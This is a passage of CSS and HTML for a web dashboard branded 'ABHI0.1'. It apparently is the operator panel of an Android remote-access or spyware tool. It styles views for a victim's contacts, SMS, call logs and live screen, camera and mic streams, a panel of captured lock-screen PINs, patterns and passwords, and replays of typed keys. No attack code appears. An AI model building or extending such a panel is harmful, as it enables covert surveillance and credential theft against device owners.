.pa-contact{display:flex;align-items:center;gap:12px;padding:10px 12px;border-bottom:1px solid var(--border);transition:background .12s}
.pa-contact:last-child{border-bottom:none}
.pa-contact:hover{background:var(--bg3)}
.pa-cname{font-size:14px;font-weight:600;color:var(--text)}
.pa-cphone{font-size:12px;color:var(--text3);margin-top:2px}
.pa-cinfo{flex:1;min-width:0}
.pa-cactions{display:flex;gap:8px;flex-shrink:0}
.pa-cbtn{display:flex;align-items:center;justify-content:center;width:34px;height:34px;border-radius:50%;background:var(--bg4);border:1px solid var(--border);color:var(--text2);cursor:pointer;transition:all .15s}
.pa-cbtn.call:hover{background:var(--primary);color:#fff}
.pa-cbtn.msg:hover{background:var(--primary-2);color:#fff}
.dp-display{display:flex;flex-direction:column;align-items:center;justify-content:flex-end;padding:14px 16px 6px;gap:4px}
.dp-num{font-family:'IBM Plex Mono',monospace;font-size:30px;font-weight:500;color:var(--text);letter-spacing:2px;min-height:38px;word-break:break-all;text-align:center}
.dp-desc{font-size:12px;color:var(--text3);min-height:16px}
.dp-keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:4px;padding:8px 6px;max-width:320px;margin:0 auto;width:100%}
.dp-key{display:flex;flex-direction:column;align-items:center;justify-content:center;height:56px;border-radius:50%;background:transparent;border:none;color:var(--text);font-size:22px;font-weight:600;cursor:pointer;transition:background .12s}
.dp-key div{font-size:10px;font-weight:400;color:var(--text3);letter-spacing:.5px;line-height:1}
.dp-key:hover{background:var(--bg3)}
.dp-key:active{background:var(--bg4);transform:scale(.94)}
.dp-fn{color:var(--text2)}
.dp-actions{display:flex;align-items:center;justify-content:center;gap:28px;padding:8px 0 14px}
.dp-call{display:flex;align-items:center;justify-content:center;width:58px;height:58px;border-radius:50%;background:#1f9d55;color:#fff;border:none;cursor:pointer;box-shadow:0 6px 18px rgba(31,157,85,.35);transition:transform .12s,background .15s}
.dp-call:hover{background:#23b05e;transform:scale(1.06)}
.dp-call:active{transform:scale(.95)}
.dp-ic{display:flex;align-items:center;justify-content:center;width:44px;height:44px;border-radius:50%;background:var(--bg3);border:1px solid var(--border);color:var(--text2);cursor:pointer;transition:all .12s}
.dp-ic:hover{color:var(--text);background:var(--bg4)}
.pa-recents{display:flex;flex-direction:column;background:var(--bg2);border:1px solid var(--border);border-radius:16px;overflow:hidden}
.pa-callrow{display:flex;align-items:center;gap:12px;padding:10px 12px;border-bottom:1px solid var(--border)}
.pa-callrow:last-child{border-bottom:none}
.pa-callrow:hover{background:var(--bg3)}
.pa-call-ic{display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:18px}
.pa-call-ic.in{color:#3ddc84}
.pa-call-ic.out{color:#62b6ff}
.pa-call-ic.missed{color:#ff6b81}
.pa-call-info{flex:1;min-width:0}
.pa-call-name{font-size:14px;font-weight:600;color:var(--text)}
.pa-call-meta{font-size:12px;color:var(--text3);margin-top:2px}
.pa-call-time{font-size:11px;color:var(--text3);flex-shrink:0}
.pa-empty{display:flex;flex-direction:column;align-items:center;gap:8px;color:var(--text3);padding:32px 16px;text-align:center;font-size:13px}
.sms-threads{display:flex;flex-direction:column;background:var(--bg2);border:1px solid var(--border);border-radius:16px;overflow:hidden}
.sms-thread{display:flex;align-items:center;gap:12px;padding:10px 12px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .12s}
.sms-thread:hover{background:var(--bg3)}
.sms-avatar{display:flex;align-items:center;justify-content:center;width:40px;height:40px;border-radius:50%;font-size:14px;font-weight:700;color:#0b1220;flex-shrink:0;background:#89b4fa}
.sms-info{flex:1;min-width:0}
.sms-name{font-size:14px;font-weight:600;color:var(--text)}
.sms-preview{font-size:12px;color:var(--text3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px}
.sms-time{font-size:11px;color:var(--text3);flex-shrink:0}
.sms-conv{display:none;flex-direction:column;background:var(--bg2);border:1px solid var(--border);border-radius:16px;overflow:hidden}
.sms-conv.open{display:flex}
.sms-conv-hdr{display:flex;align-items:center;gap:10px;padding:10px 12px;border-bottom:1px solid var(--border);background:var(--bg3)}
.sms-conv-name{font-size:14px;font-weight:600;color:var(--text)}
.sms-conv-status{font-size:11px;color:var(--text3);margin-top:2px}
.sms-call-ic{display:flex;align-items:center;justify-content:center;width:34px;height:34px;border-radius:50%;background:var(--bg4);color:var(--primary-2);cursor:pointer}
.sms-messages{display:flex;flex-direction:column;gap:6px;padding:12px;min-height:200px;max-height:420px;overflow-y:auto}
.sms-msg{max-width:78%;padding:8px 12px;border-radius:16px;font-size:13px;line-height:1.45;word-break:break-word}
.sms-msg.sent{align-self:flex-end;background:linear-gradient(135deg,var(--primary),#7b5bff);color:#fff;border-bottom-right-radius:4px}
.sms-msg.recv{align-self:flex-start;background:var(--bg4);color:var(--text);border-bottom-left-radius:4px}
.sms-msg-time{font-size:10px;opacity:.7;margin-top:4px;text-align:right}
.sms-compose{display:flex;align-items:center;gap:8px;padding:10px 12px;border-top:1px solid var(--border);background:var(--bg3)}
.sms-comp-phone{max-width:120px;flex-shrink:0;padding:10px 12px;font-size:12px}
.sms-comp-text{flex:1;padding:10px 12px}
.sms-send{display:flex;align-items:center;justify-content:center;width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,var(--primary),#7b5bff);color:#fff;cursor:pointer;flex-shrink:0;transition:transform .12s}
.sms-send:active{transform:scale(.92)}
@media (max-width:520px){.pa-tabs{overflow-x:auto}.pa-tab{white-space:nowrap;padding:8px 14px}}

/* ================= App Info (Android Settings style) ================= */
.app-info-overlay{position:fixed;inset:0;background:rgba(3,8,15,.74);backdrop-filter:blur(3px);z-index:8000;display:flex;align-items:center;justify-content:center;padding:16px;opacity:0;pointer-events:none;transition:opacity .18s}
.app-info-overlay.open{opacity:1;pointer-events:auto}
.app-info-card{width:min(420px,100%);max-height:min(86dvh,720px);overflow-y:auto;background:var(--bg2);border:1px solid var(--border2);border-radius:20px;box-shadow:0 24px 64px rgba(0,0,0,.5);transform:translateY(10px) scale(.98);transition:transform .18s}
.app-info-overlay.open .app-info-card{transform:none}
.aii-head{display:flex;align-items:center;gap:14px;padding:20px 20px 14px}
.aii-ic{display:flex;align-items:center;justify-content:center;width:56px;height:56px;border-radius:16px;background:var(--bg4);font-size:22px;font-weight:700;color:#fff;flex-shrink:0;overflow:hidden}
.aii-ic img{width:100%;height:100%;object-fit:contain}
.aii-title{font-size:17px;font-weight:700;color:var(--text)}
.aii-sub{font-size:12px;color:var(--text3);margin-top:3px;word-break:break-all}
.aii-sec{font-size:11px;font-weight:700;letter-spacing:1px;color:var(--text3);text-transform:uppercase;padding:12px 20px 6px}
.aii-rows{border-top:1px solid var(--border);border-bottom:1px solid var(--border);background:rgba(255,255,255,.015)}
.aii-row{display:flex;align-items:center;gap:10px;padding:11px 20px;border-bottom:1px solid var(--border);font-size:13px}
.aii-row:last-child{border-bottom:none}
.aii-row .label{color:var(--text3);width:128px;flex-shrink:0;font-size:12px}
.aii-row .val{color:var(--text);flex:1;word-break:break-all}
.aii-actions{display:flex;flex-direction:column;padding:8px 0 6px}
.aii-btn{display:flex;align-items:center;gap:12px;padding:12px 20px;font-size:14px;color:var(--text2);cursor:pointer;transition:background .12s}
.aii-btn:hover{background:var(--bg3);color:var(--text)}
.aii-btn .mat{color:var(--text3);font-size:20px}
.aii-btn.danger{color:#ff8a9a}
.aii-btn.danger .mat{color:#ff6b81}
.aii-btn .act{flex:1;text-align:right;font-size:11px;color:var(--text3)}
.aii-open{cursor:pointer}

/* ---- Lock: captured code (read-only) ---- */
.lock-capture-panel{margin-top:14px;padding:14px;border:1px solid var(--border);border-radius:var(--radius2);background:linear-gradient(135deg,rgba(124,92,255,.08),rgba(94,231,255,.03));display:flex;flex-direction:column;gap:12px}
.lock-capture-top{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.lock-kind-badge{font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:.14em;padding:5px 9px;border-radius:999px;background:rgba(148,163,184,.1);border:1px solid var(--border);color:var(--text2)}
.lock-kind-pin{background:rgba(251,191,36,.1);border-color:rgba(251,191,36,.32);color:#fbbf24}
.lock-kind-pattern{background:rgba(124,92,255,.16);border-color:rgba(124,92,255,.4);color:#b8a7ff}
.lock-kind-password{background:rgba(34,197,94,.1);border-color:rgba(34,197,94,.3);color:#4ade80}
.lock-captured-at{font-size:11px;color:var(--text3)}
.lock-pattern-wrap{width:min(260px,100%);margin:0 auto}
.lock-pattern-wrap svg{display:block;width:100%;height:auto;border-radius:14px;background:rgba(4,10,18,.45);border:1px solid var(--border)}
.lock-pattern-seq{text-align:center;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--text2);letter-spacing:.18em;margin-top:6px}
.lock-code-wrap{display:flex;flex-direction:column;gap:7px}
.lock-code-label{font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:.2em;color:var(--text3)}
.lock-code-value{font-family:'IBM Plex Mono',monospace;font-size:clamp(26px,5vw,42px);letter-spacing:.18em;color:var(--text);background:rgba(4,10,18,.5);border:1px solid var(--border);border-radius:12px;padding:14px 18px;word-break:break-all;line-height:1.15;box-shadow:inset 0 1px 0 rgba(255,255,255,.04)}
.lock-auto-note{font-size:11px;color:var(--text3);line-height:1.6}
.lock-storage-row{font-size:11px;color:var(--text3);display:flex;align-items:center;gap:8px;flex-wrap:wrap;word-break:break-all}

/* ---- Input Visualization ---- */
.input-viz-empty{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px;text-align:center;color:var(--text3);gap:8px}
.input-viz-empty .material-symbols-outlined{font-size:48px;color:var(--accent);opacity:0.6}
.input-viz-empty p{font-size:14px;color:var(--text2);margin:0}
.input-viz-hint{font-size:12px !important;color:var(--text3);opacity:0.7}

.input-viz-active{display:flex;flex-direction:column;gap:12px}
.input-viz-header{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;padding:8px 12px;background:rgba(124,92,255,0.1);border:1px solid var(--glass-border);border-radius:var(--radius2)}
.input-viz-type{font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:600;color:var(--accent);background:rgba(124,92,255,0.15);padding:4px 10px;border-radius:999px;letter-spacing:.1em;text-transform:uppercase}
.input-viz-device{font-size:11px;color:var(--text2);background:rgba(148,163,184,0.08);padding:4px 10px;border-radius:999px}
.input-viz-time{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--text3);background:rgba(148,163,184,0.08);padding:4px 10px;border-radius:999px}

.input-viz-content{width:100%;min-height:200px;background:rgba(4,10,18,0.4);border:1px solid var(--border);border-radius:var(--radius2);position:relative;overflow:hidden}
.input-viz-content svg{width:100%;height:100%;display:block}

.iv-pattern-svg{width:100%;height:100%;display:block}
.iv-pattern-node{transition:all 0.2s ease}
.iv-pattern-node.active .iv-node-outer{stroke:var(--accent);filter:drop-shadow(0 0 8px var(--accent))}
.iv-pattern-node.active .iv-node-inner{fill:var(--accent)}
.iv-pattern-line{stroke:var(--accent);stroke-width:3;stroke-linecap:round;stroke-linejoin:round;filter:drop-shadow(0 0 6px var(--accent))}

.iv-pin-display{display:flex;align-items:center;justify-content:center;gap:12px;padding:20px}
.iv-pin-dot{width:20px;height:20px;border-radius:50%;background:var(--border);border:2px solid var(--border);transition:all 0.2s ease}
.iv-pin-dot.filled{background:var(--accent);border-color:var(--accent);box-shadow:0 0 12px var(--accent-glow);animation:ivDotFill 0.3s ease}
@keyframes ivDotFill{0%{transform:scale(1)}50%{transform:scale(1.3)}100%{transform:scale(1)}}

.iv-password-display{font-family:'IBM Plex Mono',monospace;font-size:clamp(18px,4vw,28px);letter-spacing:0.2em;color:var(--accent);padding:20px;background:rgba(4,10,18,0.5);border:1px solid var(--border);border-radius:var(--radius2);text-align:center;min-height:60px}

.input-viz-history{max-height:300px;overflow-y:auto;padding:8px}
.iv-history-item{display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:var(--radius2);margin-bottom:8px;transition:background 0.15s}
.iv-history-item:hover{background:rgba(124,92,255,0.08)}
.iv-history-type{font-family:'IBM Plex Mono',monospace;font-size:11px;font-weight:600;padding:3px 8px;border-radius:999px;letter-spacing:.08em;text-transform:uppercase}
.iv-history-type.pin{background:rgba(251,191,36,0.15);border:1px solid rgba(251,191,36,0.3);color:#fbbf24}
.iv-history-type.pattern{background:rgba(124,92,255,0.15);border:1px solid rgba(124,92,255,0.3);color:#b8a7ff}
.iv-history-type.password{background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.3);color:#4ade80}
.iv-history-type.key{background:rgba(56,189,248,0.15);border:1px solid rgba(56,189,248,0.3);color:#7dd3fc}
.iv-key-display{font-family:'IBM Plex Mono',monospace;font-size:clamp(14px,3vw,20px);color:var(--accent);padding:16px;background:rgba(4,10,18,0.5);border:1px solid var(--border);border-radius:var(--radius2);text-align:center;word-break:break-all;min-height:52px}
.iv-history-details{flex:1;min-width:0}
.iv-history-summary{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--text);letter-spacing:.1em}
.iv-history-meta{font-size:11px;color:var(--text3);margin-top:2px}
.iv-history-time{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--text3);white-space:nowrap;margin-left:auto}

.input-viz-active{animation:ivFadeIn 0.3s ease}
@keyframes ivFadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}

/* ============================================================
   HBNC streaming layout v4 — full-viewport preview, compact monitor,
   single bottom toolbar, right-side tools drawer
   ============================================================ */
:root{--hw-bar-h:calc(56px + env(safe-area-inset-bottom,0px))}
body.hbnc-active .content{padding:0;overflow:hidden;position:relative;height:100%}
body.hbnc-active #hbcn.tab-view{position:absolute;inset:0;height:auto;min-height:0;display:flex;flex-direction:column;overflow:hidden;padding:0}
body.hbnc-max .topbar{display:none}
body.hbnc-max .shell>.sidebar{display:none}
body.hbnc-max .main{width:100%}
/* Max = cinema mode: drop the status strip and workspace header so the stream
   gets every pixel. The single bottom toolbar stays available. */
body.hbnc-max #hbcn .hbnc-ws-hdr{display:none}
body.hbnc-max #hbcn .conn-status{display:none}
body.hbnc-max #hbcn .hbnc-ws-body{flex:1;min-height:0}
#hbcn .hbnc-shell{display:flex;flex:1;min-height:0;min-width:0;height:100%;overflow:hidden;position:relative;background:#04080e}
#hbcn .hbnc-workspace{flex:1;min-width:0;min-height:0;overflow:hidden;display:flex;flex-direction:column;position:relative}
#hbcn .hbnc-ws{flex:1;min-height:0;min-width:0;overflow:hidden}
#hbcn .hbnc-ws-hdr{min-height:34px;height:34px;padding:0 10px;gap:8px;flex-shrink:0;font-size:11px;background:rgba(9,17,28,.9);border-bottom:1px solid var(--border)}
#hbcn .hbnc-ws-hdr .dot{width:7px;height:7px;flex-shrink:0}
#hbcn .hbnc-ws-label{font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
#hbcn .hbnc-ws-ctrls{gap:2px}
#hbcn .hbnc-ws-ctrls .hbnc-tb-btn{width:32px;height:32px;min-width:32px;min-height:32px}
#hbcn .hbnc-ws-body{flex:1;min-height:0;min-width:0;overflow:hidden;position:relative}
#hbcn .hbnc-screen-area{position:absolute;inset:0;width:auto;height:auto;min-height:0;overflow:hidden;display:flex;align-items:center;justify-content:center;background:#000}
#hbcn #hbcnCanvas{display:block;max-width:100%;max-height:100%;object-fit:contain}
#hbcn .hw-webp-frame{max-width:100%;max-height:100%;width:auto;height:auto;object-fit:contain;margin:auto}
#hbcn .hbnc-error{position:absolute;inset:0;z-index:6}
/* The live monitor owns the top edge. No permanent header/status rows: both
   the old workspace header and the 22px connection strip are removed from the
   screen layout, and their metadata moves into this overlay + the tools
   drawer. Camera/mic keep their own headers because those host controls. */
#hwWsScreen .hbnc-ws-hdr{display:none}
#hbcn .conn-status{display:none}
.hw-monitor{position:absolute;top:8px;left:8px;z-index:9;display:flex;align-items:center;gap:6px;
  max-width:calc(100% - 16px);padding:5px 9px;border:1px solid rgba(255,255,255,.13);
  border-radius:999px;background:rgba(4,9,16,.64);-webkit-backdrop-filter:blur(10px);
  backdrop-filter:blur(10px);color:#dbe7f3;font-size:10px;line-height:1;letter-spacing:.02em;
  pointer-events:none;box-shadow:0 4px 16px rgba(0,0,0,.3);white-space:nowrap;overflow:hidden}
.hw-mon-dot{width:6px;height:6px;border-radius:50%;background:#718096;flex:0 0 auto;transition:background .2s}
.hw-mon-dot.live{background:#35d07f;box-shadow:0 0 8px rgba(53,208,127,.85)}
.hw-mon-dot.connecting{background:#f5b84b;box-shadow:0 0 8px rgba(245,184,75,.6);animation:hwPulse 1.2s ease-in-out infinite}
.hw-mon-dot.error{background:#ff5f7d;box-shadow:0 0 8px rgba(255,95,125,.55)}
@keyframes hwPulse{0%,100%{opacity:1}50%{opacity:.35}}
.hw-mon-sep{width:1px;height:10px;background:rgba(255,255,255,.16);flex:0 0 auto}
.hw-mon-state{font-size:9px;font-weight:700;letter-spacing:.09em;color:#dfe9f4}
.hw-mon-item{color:#b9c7d6;font-variant-numeric:tabular-nums;overflow:hidden;text-overflow:ellipsis}
.hw-mon-fmt{color:#fff;font-weight:600}
body.hw-tools-open .hw-monitor{opacity:0;visibility:hidden;transition:opacity .15s,visibility 0s linear .15s}
/* One-row primary toolbar. Fixed structure so every control fits a 320px
   viewport without wrapping or horizontal scrolling. */
#hbcn .hbnc-ws-bar{display:flex;flex-wrap:nowrap;align-items:stretch;gap:5px;height:var(--hw-bar-h);min-height:var(--hw-bar-h);padding:5px 6px calc(5px + env(safe-area-inset-bottom,0px));border-top:1px solid var(--border);flex-shrink:0;position:relative;z-index:60;background:linear-gradient(180deg,rgba(13,27,42,.99),rgba(6,15,25,.99));box-shadow:0 -10px 24px rgba(0,0,0,.18);overflow:visible}
#hwWsScreen .hbnc-ws-bar{display:grid;grid-template-columns:40px 40px minmax(40px,1fr) 40px minmax(48px,1fr) 40px 44px;gap:5px}
#hbcn .hbnc-ws-bar>*{min-width:0}
#hbcn .hbnc-ws-action{display:flex;align-items:center;justify-content:center;gap:4px;min-width:0;min-height:44px;padding:0 8px;background:rgba(255,255,255,0.06);border:1px solid var(--border);border-radius:10px;font-size:12px;color:var(--text2);cursor:pointer;transition:background .15s,border-color .15s,color .15s;white-space:nowrap;font-family:inherit}
#hbcn .hbnc-ws-action:hover{background:rgba(255,255,255,0.1);color:var(--text)}
#hbcn .hbnc-ws-action .material-symbols-outlined{font-size:19px;flex-shrink:0}
#hbcn .hbnc-ws-action.danger{background:rgba(229,57,53,0.14);border-color:rgba(255,95,125,.32);color:#ff8aa3}
#hbcn .hbnc-ws-action.hw-freeze-on{background:rgba(94,231,255,.16);border-color:rgba(94,231,255,.55);color:#5ee7ff;box-shadow:inset 0 0 0 1px rgba(94,231,255,.15)}
/* Phone-style system navigation row. Sits directly under the screen area and
   above the primary toolbar, spanning the full workspace width. */
#hbcn .hw-navbar{display:flex;align-items:stretch;gap:4px;flex-shrink:0;padding:4px 6px;background:linear-gradient(180deg,rgba(9,17,28,.98),rgba(6,13,22,.98));border-top:1px solid var(--border);position:relative;z-index:58}
#hbcn .hw-navbar .hw-nav-btn{flex:1 1 0;min-width:0;display:flex;align-items:center;justify-content:center;gap:4px;min-height:38px;padding:0 4px;background:rgba(255,255,255,.05);border:1px solid var(--border);border-radius:8px;color:var(--text2);font-size:11px;font-family:inherit;cursor:pointer;transition:background .15s,border-color .15s,color .15s;white-space:nowrap}
#hbcn .hw-navbar .hw-nav-btn:hover{background:rgba(255,255,255,.1);color:var(--text)}
#hbcn .hw-navbar .hw-nav-btn:active{background:rgba(94,231,255,.16);border-color:rgba(94,231,255,.5);color:#5ee7ff}
#hbcn .hw-navbar .hw-nav-btn .material-symbols-outlined{font-size:18px;flex-shrink:0}
#hbcn .hw-navbar .hw-nav-lbl{display:none;font-size:10px;letter-spacing:.02em}
@media(min-width:680px){#hbcn .hw-navbar .hw-nav-lbl{display:inline}}
#hbcn .hbnc-ws.hw-fs .hw-navbar{position:absolute;left:0;right:0;bottom:var(--hw-bar-h);z-index:13;border-top:none;background:linear-gradient(0deg,rgba(0,0,0,.72),rgba(0,0,0,.28))}
#hbcn .hbnc-ws-bar .hw-lbl{display:none}
#hbcn .hw-mode-wrap,#hbcn .hw-scread-wrap,#hbcn .hw-qual{display:flex;align-items:stretch;min-width:0;width:100%}
#hbcn select.hw-quality-sel{width:100%;height:100%;min-height:44px;padding:0 4px;font-size:10.5px;text-align:center;border-radius:10px;background:rgba(255,255,255,0.06);border:1px solid var(--border);color:var(--text2);min-width:0}
#hbcn .hw-scread-btn,#hbcn .hw-qual-btn{width:100%;height:100%;min-height:44px;padding:0 5px;justify-content:center;gap:3px;font-size:11px;border-radius:10px}
#hbcn .hw-scread-btn .material-symbols-outlined{font-size:19px}
#hbcn .hw-qual-btn .material-symbols-outlined:first-child{display:none}
#hbcn .hw-qual-caret{display:none}
#hbcn .hw-qual-val{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:100%}
#hbcn .hw-scread-state{display:none}
#hbcn #screenReadToggle{position:relative}
#hbcn #screenReadToggle::after{content:'';position:absolute;right:5px;bottom:5px;width:5px;height:5px;border-radius:50%;background:var(--text3);box-shadow:0 0 0 1px rgba(0,0,0,.4)}
#hbcn #screenReadToggle.active::after{background:#7fe085;box-shadow:0 0 6px rgba(127,224,133,.8)}
#hbcn .hbnc-ws-action.hw-more-trigger{font-size:11px}
#hwWsCamera .hbnc-ws-bar,#hwWsMic .hbnc-ws-bar{gap:5px}
#hwWsCamera .hbnc-ws-bar>.hbnc-ws-action,#hwWsMic .hbnc-ws-bar>.hbnc-ws-action{flex:1 1 0}
#hwWsCamera .hbnc-ws-bar>.hw-more-trigger,#hwWsMic .hbnc-ws-bar>.hw-more-trigger{flex:0 0 48px}
#hbcn .conn-status{order:-1;height:22px;min-height:22px;padding:0 10px;font-size:10px;letter-spacing:.02em;border-top:none;border-bottom:1px solid var(--border);background:rgba(7,17,29,.92);flex-shrink:0}
#hbcn .conn-status .dot{width:6px;height:6px}
/* Keep the live controls in normal flow so they never cover the last rows. */
#hbcn .hbnc-ws.hw-fs .hbnc-ws-hdr{position:relative;top:auto;left:auto;right:auto;background:rgba(9,17,28,.9);border-bottom:1px solid var(--border);padding:0 10px;pointer-events:auto}
#hbcn .hbnc-ws.hw-fs .hbnc-ws-hdr .hbnc-ws-label{text-shadow:none}
#hbcn .hbnc-ws.hw-fs .hbnc-ws-body{position:relative;inset:auto;z-index:auto;background:#000}
#hbcn .hbnc-ws.hw-fs .hbnc-ws-bar{position:relative;left:auto;right:auto;bottom:auto;z-index:60;background:linear-gradient(180deg,rgba(13,27,42,.99),rgba(6,15,25,.99));border-top:1px solid var(--border);padding:6px 6px calc(6px + env(safe-area-inset-bottom,0px));backdrop-filter:none}
#hbcn .hbnc-ws.hw-fs .hbnc-ws-action,#hbcn .hbnc-ws.hw-fs .hw-qual-btn,#hbcn .hbnc-ws.hw-fs .hw-scread-btn,#hbcn .hbnc-ws.hw-fs .hw-quality-sel{background:rgba(255,255,255,0.06);backdrop-filter:none;border-color:var(--border);color:var(--text2)}
#hbcn .hbnc-ws.hw-fs .hbnc-ws-action.danger{background:rgba(229,57,53,0.16);border-color:rgba(255,95,125,.3);color:#ff8aa3}
#hbcn .hbnc-ws.hw-fs .hbnc-ws-action.hw-freeze-on{background:rgba(94,231,255,.16);border-color:rgba(94,231,255,.55);color:#5ee7ff}
/* Popovers stay above the toolbar and inside the viewport. */
#hbcn #hwStartMenu{bottom:calc(100% + 8px);left:0;max-width:calc(100vw - 20px)}
#hbcn .hw-qual-menu{bottom:calc(100% + 8px);right:0;max-height:min(64dvh,420px);overflow-y:auto;overscroll-behavior:contain}
#hbcn .hw-qual-title{padding:9px 12px 5px;font-size:10px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--text3);border-bottom:1px solid var(--border)}
/* Never let transient toasts/errors cover the only primary toolbar. */
body.hbnc-mode .toast-container{bottom:calc(var(--hw-bar-h) + 10px)}
body.hbnc-mode .ui-error{bottom:calc(var(--hw-bar-h) + 12px)}
/* Tools: one right-side drawer that overlays, never reserves width, and sits
   above the single bottom toolbar. No backdrop — the live preview stays
   visible on the left and the toolbar stays fully usable below. */
.moremenu{position:fixed;top:0;right:0;left:auto;bottom:var(--hw-bar-h);
  width:min(360px,88vw);max-width:100vw;height:auto;max-height:none;
  transform:translateX(100%);overflow-y:auto;overscroll-behavior:contain;
  -webkit-overflow-scrolling:touch;touch-action:pan-y;padding-bottom:8px;
  background:var(--bg2);border:1px solid var(--border);border-right:none;border-bottom:none;
  border-radius:0;box-shadow:-18px 0 44px rgba(0,0,0,.55);
  z-index:200;visibility:hidden;pointer-events:none;
  transition:transform .24s ease,visibility 0s linear .24s;display:block}
.moremenu.open{transform:translateX(0);visibility:visible;pointer-events:auto;
  transition:transform .24s ease,visibility 0s}
.moremenu-backdrop{display:none!important}
.moremenu-hdr{position:sticky;top:0;z-index:3;background:var(--bg2);padding:10px 12px 10px 16px;
  border-bottom:1px solid var(--border);font-size:13px;font-weight:600;color:var(--text);gap:8px;
  letter-spacing:.02em}
.moremenu-hdr .material-symbols-outlined{font-size:18px;color:var(--red)}
.moremenu-item{min-height:44px;padding:10px 16px;font-size:13px;white-space:normal;text-align:left}
.moremenu-close{width:40px;height:40px;min-width:40px;font-size:22px;border:none;background:transparent;color:var(--text3);cursor:pointer;border-radius:10px}
.moremenu-close:hover{background:rgba(255,255,255,.08);color:var(--text)}
.moremenu-close:focus-visible,.moremenu-item:focus-visible{outline:2px solid var(--accent2,#5ee7ff);outline-offset:-2px}
.hw-tools-stats{margin:10px 12px 6px;padding:9px 11px;border:1px solid var(--border);border-radius:12px;
  background:rgba(255,255,255,.035);display:grid;gap:5px}
.hw-stat{display:flex;align-items:baseline;justify-content:space-between;gap:10px;font-size:11px;color:var(--text3)}
.hw-stat strong{color:var(--text2);font-weight:600;font-variant-numeric:tabular-nums;text-align:right;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.hw-tools-note{margin:2px 14px 10px;color:var(--text3);font-size:10px;line-height:1.5}
.hw-item-state{margin-left:auto;font-size:9px;font-weight:700;letter-spacing:.05em;color:var(--text3);
  background:rgba(255,255,255,.06);padding:2px 7px;border-radius:999px;flex:0 0 auto}
.hw-item-state.on{color:#7fe085;background:rgba(76,175,80,.15)}
@media(max-width:520px){
  #hbcn .hbnc-ws-bar{gap:4px;padding:5px 5px calc(5px + env(safe-area-inset-bottom,0px))}
  #hwWsScreen .hbnc-ws-bar{grid-template-columns:40px 40px minmax(38px,1fr) 38px minmax(46px,1fr) 38px 40px;gap:4px}
  #hbcn .hbnc-ws-action{min-height:44px;padding:0 5px}
  #hbcn select.hw-quality-sel,#hbcn .hw-scread-btn,#hbcn .hw-qual-btn{min-height:44px}
  #hbcn .hw-qual-btn{font-size:10px;padding:0 3px}
  #hbcn .hbnc-ws-hdr{padding:0 8px}
  .moremenu{width:min(340px,88vw);border-radius:0}
  .hw-monitor{font-size:9.5px;gap:5px;padding:4px 8px}
}
@media(min-width:700px){
  #hwWsScreen .hbnc-ws-bar{grid-template-columns:44px 44px 92px 44px 104px 44px 52px;justify-content:center;gap:8px}
  #hwWsCamera .hbnc-ws-bar,#hwWsMic .hbnc-ws-bar{justify-content:center}
  #hwWsCamera .hbnc-ws-bar>.hbnc-ws-action,#hwWsMic .hbnc-ws-bar>.hbnc-ws-action{flex:0 1 120px}
  #hwWsCamera .hbnc-ws-bar>.hw-more-trigger,#hwWsMic .hbnc-ws-bar>.hw-more-trigger{flex:0 0 52px}
}
@media(max-height:560px){
  #hbcn .hbnc-ws-hdr{min-height:30px;height:30px}
  #hbcn .conn-status{height:20px;min-height:20px}
  :root{--hw-bar-h:calc(50px + env(safe-area-inset-bottom,0px))}
  #hbcn .hbnc-ws-bar{padding-top:4px;padding-bottom:calc(4px + env(safe-area-inset-bottom,0px))}
  #hbcn .hbnc-ws-action,#hbcn select.hw-quality-sel,#hbcn .hw-scread-btn,#hbcn .hw-qual-btn{min-height:38px}
}
@media(min-width:900px){
  .moremenu{width:360px}
}
    </style>
</head>
<body>


<!-- Loading -->
<div class="load" id="loadingOverlay">
    <div class="load-logo">ABHI0.1</div>
    <div class="loader"></div>
</div>

<!-- Toast -->
<div id="toastContainer" class="toast-container"></div>

<!-- Sidebar mobile backdrop -->
<div class="sidebar-backdrop" id="sidebarBackdrop" onclick="closeSidebar()"></div>

<!-- URL Modal -->
<div class="modal-overlay" id="urlModal">
    <div class="modal">
        <div class="modal-hdr">
            <span class="material-symbols-outlined" style="font-size:16px;color:var(--red)">link</span>
            Server URL
            <span class="modal-close" onclick="closeUrlModal()">&times;</span>
        </div>
        <div class="modal-body">
            <input type="url" id="urlInput" placeholder="https://your-server.trycloudflare.com">
            <div class="modal-info" id="urlCurrent">Current: loading...</div>
            <div class="modal-info">All endpoints derive from this URL automatically.</div>
            <div class="modal-err" id="urlError"></div>
        </div>
        <div class="modal-footer">
            <button class="btn btn-outline btn-sm" onclick="closeUrlModal()">Cancel</button>
            <button class="btn btn-red btn-sm" onclick="saveUrl()">Save &amp; Connect</button>
        </div>
    </div>
</div>

<!-- Shell -->
<div class="shell">
    <!-- Sidebar -->
    <div class="sidebar" id="sidebar">
        <div class="sidebar-logo">
            <span class="sidebar-brand-txt">ABHI0.1</span>
        </div>

        <div class="nav-section">Main</div>
        <div class="nav-item active" data-tab="home">
            <span class="material-symbols-outlined">dashboard</span><span>Dashboard</span>
        </div>
        <div class="nav-item" data-tab="hbcn">
            <span class="material-symbols-outlined">cast</span><span>Live Screen (HBNC)</span>
        </div>

        <div class="nav-section">Communication</div>
        <div class="nav-item" data-tab="contacts">
